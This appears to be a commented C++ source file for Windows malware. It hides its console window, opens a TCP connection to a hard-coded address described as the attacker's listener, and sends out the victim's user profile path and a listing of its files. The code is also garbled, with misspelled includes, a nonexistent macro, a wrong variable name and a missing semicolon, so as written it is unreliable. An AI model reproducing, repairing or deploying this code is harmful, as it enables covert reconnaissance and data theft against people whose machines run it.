#define _WINSOCK_DEPRECATED_NO_WARNING //The code shouldn't give deprecated warning for not using updated
#pragma comment(lib, "Ws2_32.lib") //For networking(to use socket), we'll need Ws_32.lib

//Headers of the program
//Always add -lws2_32 in compiler options

#inlude<iostram> //Standard input and output
#inlude<winsock2.h> //Networking
#inlude<stdio.h> //Standard input and output

#inlude<stdlib.h> //standard library
#inlude<dirent.h> //directory utilities
#inlude<string>  //String Utilities

//Next function is to collect path of current working directory of the user.

char* userDirectory() //char* before func_name meands it will return pointer to a string
{
	char* pPath; //variable of type "pointer to char"
	pPath = getenv("USERPROFILE"); //TO get pwd stored in environment variable userprofile
	if(pPath!=NULL)
		{
		return pPath;
		}
	else
		{
		perror("");    //If pPath not accessible print the error and exit	
		}
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); //Not to show program window
	WSADATA WSAData; //structure declaration holding info of win socket implementation
	SOCKET server; //variable to store connection of SOCKET type 
	SOCKADDR_IN addr; //struct to store connection details of SOCKADDR_IN type
	
	WSAStartup(MAKEWORLD(2, 0), &WSAData); //Initialization of winsock library, To open connection
	server = socket(AF_INET, SOCK_STREAM, 0); //To set up TCP socket
	addr.sin_addr.s_addr = inet_addr("192.168.29.244"); //Replace this by your IP address
	addr.sin_family = AF_INET; //To create an IPv4 family to communicate over TCP
	addr.sin_port = htons(4433); //Replace by the port number you are listening on
	
	connect(server, (SOCKADDR *)&addrr, sizeof(addr)); //To establish the connection
	
	
	//Next we are going to read the directory
	char* pPath = userDirectory(); //A local var pPath to store pwd
	send(server, pPath, sizeof(pPath), 0); //To get path on attacker's device
	
	DIR *dir; //new var dir: pointer to type DIR
	struct dirent *ent; //new var ent: pointer to structure
	if((dir = opendir(pPath))!=NULL)  //To see if opening directory on recieved path yields wome result
		{
		while ((ent = readdir (dir))!=NULL)	//TO iterate over directories
			{
			send(server, ent->d_name, sizeof(ent->d_name), 0); //to get list of files in current dir
			}
			closedir(dir); //close the dir that is read
		}
	else
		{
		perror("")
		}
	
	closesocket(server); //close the connection
	WSACleanup(); //Clean up the winsock lib components

}
	
	

